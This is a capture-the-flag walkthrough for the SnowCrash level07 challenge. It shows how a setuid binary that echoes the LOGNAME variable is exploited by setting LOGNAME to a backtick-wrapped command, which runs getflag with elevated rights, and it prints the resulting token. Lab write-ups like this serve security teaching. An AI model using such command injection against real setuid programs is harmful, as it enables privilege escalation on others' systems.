# SnowCrash Level07 Guide
This guide will walk you through the process of finding the password for the `flag07` user.

## Procedure:

1. **Examine your environment**
   
`id` : Shows user and group identities that you have. 
```bash
uid=2007(level07) gid=2007(level07) groups=2007(level07),100(users)
```
`pwd` : Displays the current directory you are in.
```bash
/home/user/level07
```
`ls -la` : Lists files and their permissions in the current directory.
```bash
-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
```

2. **Analyse level07**

We execute the file level07.
```bash
./level07
```
Returns
```bash
level07
```
The program displays the string "level07".
We are going to look at where the string comes from.
```bash
strings level07 | grep "level07"
```
Returns
```bash
/home/user/level07
level07.c
/home/user/level07/level07.c
level07.c
```
But there is not the file level07.c in the current directory.
We are going to look at where the string comes from, but without the grep filter.
```bash
strings level07
```
Returns
```bash
...
LOGNAME
/bin/echo %s
...
```
The program uses the echo command to display the message.
The message displayed is the value of the LOGNAME environment variable.
We are going to change the value of the LOGNAME environment variable to execute the getflag command instead of echo.

3. **Check and change the LOGNAME environment variable**

We display the value of the LOGNAME environment variable.
```bash
echo $LOGNAME
```
Returns
```bash
level07
```
If we change the value of the LOGNAME environment variable, `./level07` will display the new value.
```bash
export LOGNAME=getflag
./level07
```
Returns
```bash
getflag
```

4. **Get the flag**

With `LOGNAME=getflag`, the shell interprets `getflag` as a string.
For the shell to interpret `getflag` as a command, we need to use the backticks.
```bash
export LOGNAME=\`getflag\`
./level07
```
Returns
```bash
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

Congratulations! We have succeeded in obtaining the token!
We now access level 08.
```bash
su level08
```